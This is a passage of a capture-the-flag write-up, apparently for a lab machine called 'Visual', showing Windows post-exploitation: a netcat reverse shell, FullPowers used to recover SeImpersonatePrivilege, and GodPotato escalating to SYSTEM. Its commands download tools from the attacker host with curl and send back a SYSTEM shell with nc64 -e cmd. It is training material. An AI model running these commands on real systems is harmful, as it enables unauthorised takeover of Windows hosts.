class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/d8a19bae0ee1433fa65ea8c07644eacd" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/visual/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.28] from (UNKNOWN) [10.129.229.122] 49682
+Microsoft Windows [Version 10.0.17763.4851]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+nt authority\local service</span></span></span></code></pre><div id="https://www.notion.so/4a49cb79cd044475becad8a487492e0d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/52050d95c8b4431e90ed74d64ef23b4a" class="Divider"></div><h3 id="https://www.notion.so/5924a0401c934431af02f95bed44cc66" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/5924a0401c934431af02f95bed44cc66"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">local service</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/6ad4e6e3ab13403786223fff217d337a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the service account compromised, we can immediately target the impersonate privilege. But wait … where are the privileges?</span></span></p></div><pre id="https://www.notion.so/89370a1269cd463e8e876bdf12328ca8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span></span></span></code></pre><div id="https://www.notion.so/f7fc854bfb7d43568639c21990c7628f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s not just disabled, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeImpersonatePrivilege</code></span><span class="SemanticString"> is missing entirely from the list.</span></span></p></div><div id="https://www.notion.so/20ab5dd9d7a1459aa6150277cdbccb7d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5487babf83a5491e9b28d00740e705eb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Default Privileges Recovery:</strong></span></span></p></div><div id="https://www.notion.so/491ac96233594b67a2236a9eea111453" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On a hardened Windows systems, some services may be configured to run with only the necessary privileges required. This may prevent privilege escalation attacks even if the service gets compromised, especially if dangerous privileges such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeImpersonatePrivilege</code></span><span class="SemanticString"> are removed.</span></span></p></div><div id="https://www.notion.so/653963bf60224b94ac63f897666c202a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, it’s discovered that a newly created scheduled task would hold all the default privileges of the creating user, basically mitigating the initial protection and allowing privilege recovery. This </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://itm4n.github.io/localservice-privileges/">post</a></span><span class="SemanticString"> by itm4n provides a detailed walkthrough of the process.</span></span></p></div><div id="https://www.notion.so/8273d6f54ddd4d5982d93373b9a76aac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Even better, there’s a tool called </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/itm4n/FullPowers">FullPowers</a></span><span class="SemanticString"> that does all this for us. Simply downloading the tool to the box and running it would recover all the default privileges.</span></span></p></div><pre id="https://www.notion.so/731e77ec47e54fc9a44ce9016ca78ce9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.28:8000/FullPowers.exe -o FullPowers.exe
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> .\FullPowers.exe
+
+[+] Started dummy thread with id 3040
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK</span></span></span></code></pre><div id="https://www.notion.so/84a6373348ca4624b0875bf21cd00f34" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As shown below, all the default privileges are recovered and enabled, including </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeImpersonatePrivilege</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/85589f6562574b429d7a5106ce02a592" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled</span></span></span></code></pre><div id="https://www.notion.so/31d66131c9f74bf79108bca1b464989e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e359f33690bc45e9b8820cce133b0a17" class="Divider"></div><h3 id="https://www.notion.so/ad90760aac984f55a26875b3ab502389" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/ad90760aac984f55a26875b3ab502389"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/6b65f2a2290e44049db596f39fccc5cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Potato Attack:</strong></span></span></p></div><div id="https://www.notion.so/d4157e5fe76a4a92abcea4f52b0054a5" class="Bookmark"><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens"><h5 class="Bookmark__Title">Abusing Tokens</h5><p class="Bookmark__Link">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</p></a></div><blockquote id="https://www.notion.so/77231fdf73c5406bbb89e7eeb4616621" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM.</span></span></blockquote><div id="https://www.notion.so/9209f6bbb9434f729fd8d5d2dd005169" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As such, this privilege has been targeted throughout the years, with different variations of Potato attacks. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/BeichenDream/GodPotato">GodPotato</a></span><span class="SemanticString"> is the latest one, which targets an essential system process RPCSS, making it effective on almost any Windows machines.</span></span></p></div><div id="https://www.notion.so/615670b0ca904aaba9b662c9d17f93ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/51eb1d64dae24684a9be73d9fcab617a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And it’s really easy to use!</span></span></p></div><pre id="https://www.notion.so/db34315cfb4847d09899f325413c0d81" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.28:8000/GodPotato-NET4.exe -o GodPotato-NET4.exe
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> .\GodPotato-NET4.exe -cmd &quot;cmd /c whoami&quot;
+
+[*] CombaseModule: 0x140727871930368
+[*] DispatchTable: 0x140727874236528
+[*] UseProtseqFunction: 0x140727873612704
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\1f0e0641-198d-4673-a578-272dae4c70fb\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000e402-0d10-ffff-5ed6-f1bbf470b0c8
+[*] DCOM obj OXID: 0x2e6820e48050f037
+[*] DCOM obj OID: 0x7f65283d54e74f0f
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 880 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4796
+nt authority\system</span></span></span></code></pre><div id="https://www.notion.so/e249db7dd1f64127a11408f6a919f1f4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/6cd5fe523bc94d548363be974daf183f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the following payload, it simply sends back a SYSTEM shell.</span></span></p></div><div id="https://www.notion.so/93b9beaba27a48bbb1ffc525157bef43" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ .\GodPotato-NET4.exe -cmd &quot;cmd /c .\nc64.exe 10.10.14.28 8001 -e cmd&quot;</code></span><span class="SemanticString"> </span></span></p></div><div id="https://www.notion.so/f496715b1b7e46cd94deb880d9707e3b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/104562f9384243f39082b862017fc44d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/visual/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.28] from (UNKNOWN) [10.129.229.122] 49691
+Microsoft Windows [Version 10.0.17763.4851]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\Temp&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+nt authority\system</span></span></span></code></pre><div id="https://www.notion.so/45cb7c1d980441bdad0b736a3ea9d7bf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e9055379d16f428990eaa9163c9acda2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/bd4990f6abde453094cdb67d07e94535" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\administrator\desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt
+
+1507a47c************************</span></span></span></code></pre><div id="https://www.notion.so/533eda9459b343fe860bdf6aed8e2cd0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/05b3c0775bbb4453a5b10731f8b8b4da" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
